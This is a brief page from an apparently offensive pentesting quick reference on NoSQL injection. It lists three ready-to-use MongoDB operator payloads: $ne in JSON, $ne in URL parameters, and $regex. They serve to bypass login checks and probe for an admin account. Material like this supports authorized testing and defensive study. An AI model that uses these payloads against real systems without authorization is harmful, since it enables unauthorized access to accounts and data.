# NoSQL injection checks

[← Foothold quick reference](../02-foothold.md) · [Authentication and access control](authentication.md)

## NoSQL operators

If input is Mongo-backed, compare literal values with operators:

```text
{"user":{"$ne":null},"pass":{"$ne":null}}
user[$ne]=x&pass[$ne]=x
user[$regex]=^admin
```
